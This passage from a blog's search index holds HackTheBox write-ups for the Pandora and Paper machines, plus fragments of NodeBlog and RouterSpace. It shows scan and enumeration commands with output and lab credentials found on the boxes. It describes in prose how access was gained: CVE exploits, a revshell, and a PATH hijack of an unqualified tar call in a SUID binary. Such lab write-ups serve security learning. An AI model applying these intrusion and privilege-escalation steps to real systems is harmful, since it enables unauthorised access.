Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -p- -Pn 10.10.11.139 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 20:10 BST Nmap scan report for 10.10.11.139 (10.10.11.139) Host is up (0.20s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 5000/tcp open upnp └─$ nmap -p22,5000 -sC -sV -Pn 10.10.11.139 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 20:30 BST Nmap scan report for 10.10.11.139 (10.","tags":["HTB","nodejs","nosql-injection","payloadsallthethings","xxe","node-serialize","deserialization","json-deserialization","mongo","mongodump","bsondump"],"title":"[HTB] Machine: NodeBlog"},{"categories":null,"contents":"Pandora Enumeration nmap └─$ nmap -sV -sC -Pn 10.10.11.136 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 19:34 BST Warning: 10.10.11.136 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.11.136 (10.10.11.136) Host is up (0.15s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) |_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Play | Landing 1503/tcp filtered imtc-mcs Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.99 seconds └─$ sudo nmap -sU 10.10.11.136 -T4 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 19:38 BST Warning: 10.10.11.136 giving up on port because retransmission cap hit (6). Stats: 0:02:58 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 20.77% done; ETC: 19:52 (0:11:15 remaining) Nmap scan report for 10.10.11.136 (10.10.11.136) Host is up (0.15s latency). Not shown: 984 closed udp ports (port-unreach) PORT STATE SERVICE 17/udp open|filtered qotd 161/udp open snmp 162/udp open|filtered snmptrap 682/udp open|filtered xfr 1013/udp open|filtered unknown 1031/udp open|filtered iad2 19140/udp open|filtered unknown 19222/udp open|filtered unknown 20154/udp open|filtered unknown 21298/udp open|filtered unknown 29823/udp open|filtered unknown 30263/udp open|filtered unknown 32768/udp open|filtered omad 40019/udp open|filtered unknown 49503/udp open|filtered unknown 55043/udp open|filtered unknown Web server gobuster └─$ gobuster dir -u http://panda.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://panda.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/22 19:58:05 Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 274] /assets (Status: 301) [Size: 307] [--\u0026gt; http://panda.htb/assets/] /.php (Status: 403) [Size: 274] /server-status (Status: 403) [Size: 274] ffuf └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u \u0026#39;http://panda.htb/\u0026#39; -H \u0026#39;Host: FUZZ.panda.htb\u0026#39; -fs 33560 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://panda.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.panda.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 33560 ________________________________________________ :: Progress: [19966/19966] :: Job [1/1] :: 120 req/sec :: Duration: [0:03:08] :: Errors: 0 :: snmpwalk apt install snmp-mibs-downloader comment line in /etc/snmp/snmp.conf snmpbulkwalk └─$ snmpbulkwalk -Cr1000 -c public -v2c 10.10.11.136 \u0026gt; snmpbulkwalk.out Foothold/User #1 If we scroll through results, we can see the creds for daniel daniel:HotelBabylon23 ssh to host User #2 Enumerate host We have another user matt He owns /var/www/pandora folder daniel@pandora:/home$ ls -lha /var/www/pandora/pandora_console/ total 1.6M drwxr-xr-x 16 matt matt 4.0K Dec 7 2021 . drwxr-xr-x 3 matt matt 4.0K Dec 7 2021 .. -rw-r--r-- 1 matt matt 3.7K Jan 3 2020 ajax.php drwxr-xr-x 6 matt matt 4.0K Dec 7 2021 attachment -rw-r--r-- 1 matt matt 1.2K Jun 17 2021 audit.log -rw-r--r-- 1 matt matt 534 Jan 3 2020 AUTHORS -rw-r--r-- 1 matt matt 585 Jan 3 2020 composer.json -rw-r--r-- 1 matt matt 16K Jan 3 2020 composer.lock -rw-r--r-- 1 matt matt 15K May 17 2019 COPYING -rw-r--r-- 1 matt matt 506 Jan 3 2020 DB_Dockerfile drwxr-xr-x 2 matt matt 4.0K Dec 7 2021 DEBIAN -rw-r--r-- 1 matt matt 3.3K Jan 3 2020 docker_entrypoint.sh -rw-r--r-- 1 matt matt 1.3K Jan 3 2020 Dockerfile drwxr-xr-x 11 matt matt 4.0K Dec 7 2021 extensions drwxr-xr-x 4 matt matt 4.0K Dec 7 2021 extras drwxr-xr-x 2 matt matt 4.0K Dec 7 2021 fonts drwxr-xr-x 5 matt matt 4.0K Dec 7 2021 general drwxr-xr-x 20 matt matt 4.0K Dec 7 2021 godmode drwxr-xr-x 21 matt matt 36K Dec 7 2021 images drwxr-xr-x 21 matt matt 4.0K Dec 7 2021 include -rw-r--r-- 1 matt matt 52K Dec 2 2021 index.php -rw-r--r-- 1 matt matt 42K Jan 3 2020 install.done drwxr-xr-x 5 matt matt 4.0K Dec 7 2021 mobile drwxr-xr-x 15 matt matt 4.0K Dec 7 2021 operation -rw-r--r-- 1 matt matt 1.3K Aug 22 18:26 pandora_console.log -rw-r--r-- 1 matt matt 234 May 17 2019 pandora_console_logrotate_centos -rw-r--r-- 1 matt matt 171 May 17 2019 pandora_console_logrotate_suse -rw-r--r-- 1 matt matt 222 May 17 2019 pandora_console_logrotate_ubuntu -rw-r--r-- 1 matt matt 4.8K May 17 2019 pandora_console_upgrade -rw-r--r-- 1 matt matt 1.2M Jan 3 2020 pandoradb_data.sql -rw-r--r-- 1 matt matt 157K Jan 3 2020 pandoradb.sql -rw-r--r-- 1 matt matt 476 Jan 3 2020 pandora_websocket_engine.service drwxr-xr-x 3 matt matt 4.0K Dec 7 2021 tests drwxr-xr-x 2 matt matt 4.0K Dec 7 2021 tools drwxr-xr-x 11 matt matt 4.0K Dec 7 2021 vendor -rw-r--r-- 1 matt matt 4.8K Jan 3 2020 ws.php But we can\u0026rsquo;t read config.php daniel@pandora:/home$ cat /var/www/pandora/pandora_console/include/config.php cat: /var/www/pandora/pandora_console/include/config.php: Permission denied daniel@pandora:/home$ ls -lha /var/www/pandora/pandora_console/include/config.php -rw------- 1 matt matt 413 Dec 3 2021 /var/www/pandora/pandora_console/include/config.php We have found vhost related to /var/www/pandora daniel@pandora:/home$ ls -lha /etc/apache2/sites-enabled/ total 8.0K drwxr-xr-x 2 root root 4.0K Dec 3 2021 . drwxr-xr-x 8 root root 4.0K Dec 7 2021 .. lrwxrwxrwx 1 root root 35 Dec 3 2021 000-default.conf -\u0026gt; ../sites-available/000-default.conf lrwxrwxrwx 1 root root 31 Dec 3 2021 pandora.conf -\u0026gt; ../sites-available/pandora.conf daniel@pandora:/home$ cat /etc/apache2/sites-enabled/pandora.conf \u0026lt;VirtualHost localhost:80\u0026gt; ServerAdmin admin@panda.htb ServerName pandora.panda.htb DocumentRoot /var/www/pandora AssignUserID matt matt \u0026lt;Directory /var/www/pandora\u0026gt; AllowOverride All \u0026lt;/Directory\u0026gt; ErrorLog /var/log/apache2/error.log CustomLog /var/log/apache2/access.log combined \u0026lt;/VirtualHost\u0026gt; It\u0026rsquo;s set to listen to localhost:80, so I need to set port forwarding Reconnect with ssh -L 8000:localhost:80 daniel@10.10.11.136 Set pandora.panda.htb to 127.0.0.1 in /etc/hosts If we visit pandora.panda.htb:8000, we have Pandora FMS with version v7.0NG.742_FIX_PERL2020 Googling revealed 2 possible paths I need creds to perform CVE-2020-5844 or CVE-2021-32099 Since I don\u0026rsquo;t have creds, let\u0026rsquo;s go with second option https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated You might need to modify port number in the poc to make it work I created a launched revshell using the uploaded file from the poc Root Enumerate SUID binaries matt@pandora:/home/matt$ find / -perm -4000 -ls 2\u0026gt;/dev/null 264644 164 -rwsr-xr-x 1 root root 166056 Jan 19 2021 /usr/bin/sudo 265010 32 -rwsr-xr-x 1 root root 31032 May 26 2021 /usr/bin/pkexec 267386 84 -rwsr-xr-x 1 root root 85064 Jul 14 2021 /usr/bin/chfn 262764 44 -rwsr-xr-x 1 root root 44784 Jul 14 2021 /usr/bin/newgrp 267389 88 -rwsr-xr-x 1 root root 88464 Jul 14 2021 /usr/bin/gpasswd 264713 40 -rwsr-xr-x 1 root root 39144 Jul 21 2020 /usr/bin/umount 262929 20 -rwsr-x--- 1 root matt 16816 Dec 3 2021 /usr/bin/pandora_backup 267390 68 -rwsr-xr-x 1 root root 68208 Jul 14 2021 /usr/bin/passwd 264371 56 -rwsr-xr-x 1 root root 55528 Jul 21 2020 /usr/bin/mount 264643 68 -rwsr-xr-x 1 root root 67816 Jul 21 2020 /usr/bin/su 264040 56 -rwsr-sr-x 1 daemon daemon 55560 Nov 12 2018 /usr/bin/at 264219 40 -rwsr-xr-x 1 root root 39144 Mar 7 2020 /usr/bin/fusermount 267387 52 -rwsr-xr-x 1 root root 53040 Jul 14 2021 /usr/bin/chsh 262815 464 -rwsr-xr-x 1 root root 473576 Jul 23 2021 /usr/lib/openssh/ssh-keysign 264920 52 -rwsr-xr-- 1 root messagebus 51344 Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper 264927 16 -rwsr-xr-x 1 root root 14488 Jul 8 2019 /usr/lib/eject/dmcrypt-get-device 266611 24 -rwsr-xr-x 1 root root 22840 May 26 2021 /usr/lib/policykit-1/polkit-agent-helper-1 We see /usr/bin/pandora_backup If I try to run it from revshell it fails Let\u0026rsquo;s add our public key to authorized_keys Now let\u0026rsquo;s try executing /usr/bin/pandora_backup again It works If I run it using ltrace it fails It drops SUID bit But we see that tar is called without full path So we might have a path injection matt@pandora:~$ ltrace /usr/bin/pandora_backup getuid() = 1000 geteuid() = 1000 setreuid(1000, 1000) = 0 puts(\u0026#34;PandoraFMS Backup Utility\u0026#34;PandoraFMS Backup Utility ) = 26 puts(\u0026#34;Now attempting to backup Pandora\u0026#34;...Now attempting to backup PandoraFMS client ) = 43 system(\u0026#34;tar -cvf /root/.backup/pandora-b\u0026#34;...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied tar: Error is not recoverable: exiting now \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 512 puts(\u0026#34;Backup failed!\\nCheck your permis\u0026#34;...Backup failed! Check your permissions! ) = 39 +++ exited (status 1) +++ I created tar script in /tmp folder and added /tmp to PATH Then executed /usr/bin/pandora_backup from /tmp Rooted ","date":"August 18, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/pandora/images/pandora.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/pandora/","summary":"Pandora Enumeration nmap └─$ nmap -sV -sC -Pn 10.10.11.136 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 19:34 BST Warning: 10.10.11.136 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.11.136 (10.10.11.136) Host is up (0.15s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) |_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","vhosts","snmp","snmpwalk","snmpbulkwalk","pandora-fms","cve-2021-32099","sqli injection","sqli-union","auth-bypass","command-injection","upload","webshell","path-hijack","apache"],"title":"[HTB] Machine: Pandora"},{"categories":null,"contents":"Paper Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.11.143 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-18 19:40 BST Nmap scan report for 10.10.11.143 (10.10.11.143) Host is up (0.14s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) |_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 |_http-title: HTTP Server Test Page powered by CentOS 443/tcp open ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_ssl-date: TLS randomness does not represent time |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US | Subject Alternative Name: DNS:localhost.localdomain | Not valid before: 2021-07-03T08:52:34 |_Not valid after: 2022-07-08T10:32:34 | tls-alpn: |_ http/1.1 |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | http-methods: |_ Potentially risky methods: TRACE Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.73 seconds Web Server gobuster └─$ gobuster dir -u http://office.paper -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://office.paper [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/19 12:43:46 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 301) [Size: 1] [--\u0026gt; http://office.paper/] /wp-content (Status: 301) [Size: 239] [--\u0026gt; http://office.paper/wp-content/] /wp-login.php (Status: 200) [Size: 3344] /license.txt (Status: 200) [Size: 19935] /manual (Status: 301) [Size: 235] [--\u0026gt; http://office.paper/manual/] /wp-includes (Status: 301) [Size: 240] [--\u0026gt; http://office.paper/wp-includes/] /wp-trackback.php (Status: 200) [Size: 136] /wp-admin (Status: 301) [Size: 237] [--\u0026gt; http://office.paper/wp-admin/] ffuf └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u \u0026#39;http://office.paper/\u0026#39; -H \u0026#39;Host: FUZZ.office.paper\u0026#39; -fs 199691 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://office.paper/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.office.paper :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 199691 ________________________________________________ [Status: 200, Size: 223163, Words: 13014, Lines: 508, Duration: 968ms] * FUZZ: chat chat.office.paper wpscan shows ... [+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04). | Found By: Rss Generator (Passive Detection) | - http://office.paper/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.2.3\u0026lt;/generator\u0026gt; | - http://office.paper/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.2.3\u0026lt;/generator\u0026gt; ... Foothold/User Wordpress is vulnerable to CVE-2019-17671 https://www.exploit-db.com/exploits/47690 Let\u0026rsquo;s register a user http://chat.office.paper/register/8qozr226AhkCHZdyY Let\u0026rsquo;s observer the chat We see the bot We can read files We have 2 users If we list the contents of the parent directory we see that it\u0026rsquo;s dwight\u0026rsquo;s home directory We can start scavenging we see hubot directory Inside the hubot\u0026rsquo;s directory we have .env file which might hold some secrets And we have some creds Queenofblad3s!23 Let\u0026rsquo;s try using found creds ssh Success Root Let\u0026rsquo;s enumerate via linpeas So the box is vulnerable to CVE-2021-3560 Download poc and execute it secnigma:secnigmaftw ","date":"August 18, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/paper/images/paper.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/paper/","summary":"Paper Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.11.143 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-18 19:40 BST Nmap scan report for 10.10.11.143 (10.10.11.143) Host is up (0.14s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) |_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.","tags":["HTB","vhosts","wordpress","wpscan","rocket-chat","cve-2019-17671","directory-traversal","linpeas","cve-2021-3560"],"title":"[HTB] Machine: Paper"},{"categories":null,"contents":"RouterSpace Enumeration nmap └─$ nmap -p- -Pn 10.10.11.148 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 18:28 BST Nmap scan report for 10.10.11.148 (10.10.11.148) Host is up (0.093s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http └─$ nmap -sC -sV -p22,80 -Pn 10.10.11.148 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 18:31 BST Nmap scan report for 10.10.11.148 (10.10.11.148) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh (protocol 2.0) | ssh-hostkey: | 3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA) | 256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA) |_ 256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519) | fingerprint-strings: | NULL: |_ SSH-2.0-RouterSpace Packet Filtering V1 80/tcp open http |_http-trane-info: Problem with XML parsing of /evox/about |_http-title: RouterSpace | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-69342 | Content-Type: text/html; charset=utf-8 | Content-Length: 69 | ETag: W/\u0026#34;45-ArZPh2MVSQ5dJi57+Br7WSwnuzQ\u0026#34; | Date: Thu, 24 Aug 2023 17:31:28 GMT | Connection: close | Suspicious activity detected !!! {RequestID: 2Zrpn mtt nnCy S } | GetRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-21663 | Accept-Ranges: bytes | Cache-Control: public, max-age=0 | Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT | ETag: W/\u0026#34;652c-17d476c9285\u0026#34; | Content-Type: text/html; charset=UTF-8 | Content-Length: 25900 | Date: Thu, 24 Aug 2023 17:31:26 GMT | Connection: close | \u0026lt;!doctype html\u0026gt; | \u0026lt;html class=\u0026#34;no-js\u0026#34; lang=\u0026#34;zxx\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;x-ua-compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;RouterSpace\u0026lt;/title\u0026gt; | \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/owl.carousel.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/magnific-popup.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/themify-icons.css\u0026#34;\u0026gt; | HTTPOptions: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-53822 | Allow: GET,HEAD,POST | Content-Type: text/html; charset=utf-8 | Content-Length: 13 | ETag: W/\u0026#34;d-bMedpZYGrVt1nR4x+qdNZ2GqyRo\u0026#34; | Date: Thu, 24 Aug 2023 17:31:26 GMT | Connection: close | GET,HEAD,POST | RTSPRequest, X11Probe: | HTTP/1.1 400 Bad Request |_ Connection: close 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port22-TCP:V=7.94%I=7%D=8/24%Time=64E79412%P=x86_64-pc-linux-gnu%r(NULL SF:,29,\u0026#34;SSH-2\\.0-RouterSpace\\x20Packet\\x20Filtering\\x20V1\\r\\n\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port80-TCP:V=7.94%I=7%D=8/24%Time=64E79412%P=x86_64-pc-linux-gnu%r(GetR SF:equest,14B8,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\n SF:X-Cdn:\\x20RouterSpace-21663\\r\\nAccept-Ranges:\\x20bytes\\r\\nCache-Control SF::\\x20public,\\x20max-age=0\\r\\nLast-Modified:\\x20Mon,\\x2022\\x20Nov\\x20202 SF:1\\x2011:33:57\\x20GMT\\r\\nETag:\\x20W/\\\u0026#34;652c-17d476c9285\\\u0026#34;\\r\\nContent-Type SF::\\x20text/html;\\x20charset=UTF-8\\r\\nContent-Length:\\x2025900\\r\\nDate:\\x SF:20Thu,\\x2024\\x20Aug\\x202023\\x2017:31:26\\x20GMT\\r\\nConnection:\\x20close\\ SF:r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\\n\u0026lt;html\\x20class=\\\u0026#34;no-js\\\u0026#34;\\x20lang=\\\u0026#34;zxx\\\u0026#34;\u0026gt;\\n\u0026lt; SF:head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;me SF:ta\\x20http-equiv=\\\u0026#34;x-ua-compatible\\\u0026#34;\\x20content=\\\u0026#34;ie=edge\\\u0026#34;\u0026gt;\\n\\x20\\x20\\ SF:x20\\x20\u0026lt;title\u0026gt;RouterSpace\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20name=\\\u0026#34;desc SF:ription\\\u0026#34;\\x20content=\\\u0026#34;\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20name=\\\u0026#34;viewport\\\u0026#34;\\ SF:x20content=\\\u0026#34;width=device-width,\\x20initial-scale=1\\\u0026#34;\u0026gt;\\n\\n\\x20\\x20\\x20\\ SF:x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;css/bootstrap\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x SF:20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;css/owl\\.carousel\\. SF:min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;css/ SF:magnific-popup\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20 SF:href=\\\u0026#34;css/font-awesome\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;st SF:ylesheet\\\u0026#34;\\x20href=\\\u0026#34;css/themify-icons\\.css\\\u0026#34;\u0026gt;\\n\\x20\u0026#34;)%r(HTTPOptions,10 SF:8,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\nX-Cdn:\\x20 SF:RouterSpace-53822\\r\\nAllow:\\x20GET,HEAD,POST\\r\\nContent-Type:\\x20text/h SF:tml;\\x20charset=utf-8\\r\\nContent-Length:\\x2013\\r\\nETag:\\x20W/\\\u0026#34;d-bMedpZ SF:YGrVt1nR4x\\+qdNZ2GqyRo\\\u0026#34;\\r\\nDate:\\x20Thu,\\x2024\\x20Aug\\x202023\\x2017:31 SF::26\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nGET,HEAD,POST\u0026#34;)%r(RTSPRequest SF:,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n SF:\u0026#34;)%r(X11Probe,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20 SF:close\\r\\n\\r\\n\u0026#34;)%r(FourOhFourRequest,12B,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Po SF:wered-By:\\x20RouterSpace\\r\\nX-Cdn:\\x20RouterSpace-69342\\r\\nContent-Type SF::\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x2069\\r\\nETag:\\x20W SF:/\\\u0026#34;45-ArZPh2MVSQ5dJi57\\+Br7WSwnuzQ\\\u0026#34;\\r\\nDate:\\x20Thu,\\x2024\\x20Aug\\x202 SF:023\\x2017:31:28\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nSuspicious\\x20act SF:ivity\\x20detected\\x20!!!\\x20{RequestID:\\x202Zrpn\\x20mtt\\x20\\x20nnCy\\x20 SF:\\x20\\x20\\x20S\\x20}\\n\\n\u0026#34;); Web server If we visit http://10.10.11.148/RouterSpace.apk, it downloads RouterSpace.apk file Directory brute forcing I had issues with filtering bad responses, but eventually managed to do it using feroxbuster feroxbuster └─$ feroxbuster -u http://10.10.11.148/ -n -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -X \u0026#39;Suspicious activity detected !!!\u0026#39; ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.11.148/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 👌 Status Codes │ All Status Codes! 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ 